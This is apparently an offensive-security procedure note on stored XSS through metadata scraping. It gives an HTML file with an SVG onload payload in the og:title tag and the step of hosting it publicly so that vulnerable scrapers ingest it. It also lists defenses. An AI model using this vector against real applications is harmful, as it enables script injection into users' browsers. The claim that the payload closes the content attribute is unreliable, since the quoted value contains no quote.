---
tags:
  - xss
  - payload-creation
  - html-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:02.717Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 6c674478-668f-4b3d-80de-e67dd06ac050
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-and-Host-Malicious-HTML-Payload

## Summary

This procedure creates an HTML file with JavaScript injected into the og:title Open Graph meta tag using an SVG onload payload, then hosts it on a public server to enable scraping by vulnerable applications like scrape-metadata.

## Description

In the context of exploiting stored XSS in metadata scraping modules, this step prepares the initial payload. The target is any web-accessible HTML page, but here it's a simple static file. The expected outcome is a hosted URL from which malicious metadata can be extracted without sanitization, leading to JavaScript execution when rendered in a browser. Prerequisites include access to a web hosting service.

## Requirements

1. Text editor to create HTML file
2. Web server or hosting service (e.g., pokegen.in) for uploading the file
3. Basic knowledge of HTML and JavaScript payloads

## Defense

Defensive measures and detection strategies:

- Sanitize all meta tag content before storage or rendering
- Use Content Security Policy (CSP) to block inline script execution
- Monitor for unusual meta tag content in hosted files via WAF or file scanners

## Objectives

1. Inject executable JavaScript into metadata fields
2. Host the payload accessibly for scraping
3. Set up the vector for downstream XSS exploitation

## Instructions

### Step 1: Craft the Malicious HTML

**Context**: Create the HTML file embedding the XSS payload in the og:title property to bypass basic parsing.

No command required; use a text editor.

```html
<!DOCTYPE html>
<html>
<head>
<meta property="og:title" content='https://google.com<svg/onload=prompt(1)>'>
</head>
<body>
<p>Test page for metadata scraping.</p>
</body>
</html>
```

> Save as test.html. The payload https://google.com<svg/onload=prompt(1)> closes the content attribute and injects an SVG element that executes prompt(1) on load.

### Step 2: Host the File

**Context**: Upload the file to a public server to make it scrapable.

Upload test.html to http://pokegen.in/test.html or similar.

> Verify by accessing the URL in a browser and inspecting the meta tag in source.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- payload-creation
